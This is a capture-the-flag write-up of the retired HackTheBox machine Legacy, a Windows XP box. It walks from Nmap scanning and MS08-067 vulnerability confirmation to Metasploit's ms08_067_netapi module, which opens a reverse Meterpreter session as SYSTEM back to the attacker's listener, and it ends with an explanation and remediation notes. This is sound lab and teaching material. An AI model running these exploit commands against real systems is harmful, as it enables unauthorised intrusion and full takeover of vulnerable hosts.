HTB Legacy: MS08-067 netapi from scan to SYSTEM

retired-machineeasy

Legacy is a retired HackTheBox easy Windows machine — a Windows XP box standing next to Blue in every beginner roadmap. Synopsis: SMB recon, MS08-067 confirmation, one classic exploit to SYSTEM. If you rooted Blue, Legacy teaches the older sibling of the same bug class.

$ Box info

OS: Windows XP (Professional, workgroup WORKGROUP). Difficulty: easy. Address: 10.10.10.4. Services that matter: MSRPC on 135, NetBIOS on 139, SMB on 445. Skills exercised: SMB enumeration on legacy Windows, vulnerability confirmation, Metasploit auto-targeting, SYSTEM flag hunting.

$ Skills required

Nmap service and script scanning, Metasploit module configuration (RHOSTS/LHOST discipline), Meterpreter basics.

$ Enumeration — Nmap plus vuln confirm

# nmap: services plus MS08-067 check
nmap -sC -sV -oN legacy.nmap 10.10.10.4
nmap --script smb-vuln-ms08-067 -p 445 10.10.10.4 -oN legacy.ms08-067
# nmap: XP-era SMB surface
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OS: Windows XP
# smb-vuln-ms08-067: confirmed vulnerable
Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMB server (ms08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250

Microsoft-DS on 445 with an XP-era fingerprint, plus NetBIOS alongside. The script flags the NetAPI buffer overflow (MS08-067, CVE-2008-4250) — confirmed CVE, not a hunch, and the green light for the netapi path.

$ Exploitation — MS08-067 netapi

# msfconsole: ms08_067_netapi
msfconsole -q
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(ms08_067_netapi) > set RHOSTS 10.10.10.4
msf6 exploit(ms08_067_netapi) > set LHOST 10.10.14.23
msf6 exploit(ms08_067_netapi) > run
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.4:XXXX)

The module fingerprints the exact XP service pack automatically and lands a session as NT AUTHORITY\SYSTEM.

$ Flags

User-accessible user.txt plus root.txt in the Administrator profile — both fall in the single SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.

$ Why this works

MS08-067 is a stack overflow in the Server service NetpwPathCanonicalize function — a canonicalization bug in an RPC-reachable path. Like EternalBlue after it, one malformed request equals SYSTEM.

$ Dead ends

Picking the wrong target index manually (let the module auto-target — it reads the fingerprint better than I guess it) and forgetting LHOST after a VPN reconnect (the silent session-that-never-calls-home, again).

$ Remediation notes

MS08-067 was the Conficker worm vector in 2008 — patch it, retire XP, block 445 at the edge, and inventory any remaining legacy Windows before an attacker does. Written by Lucky Thandel.
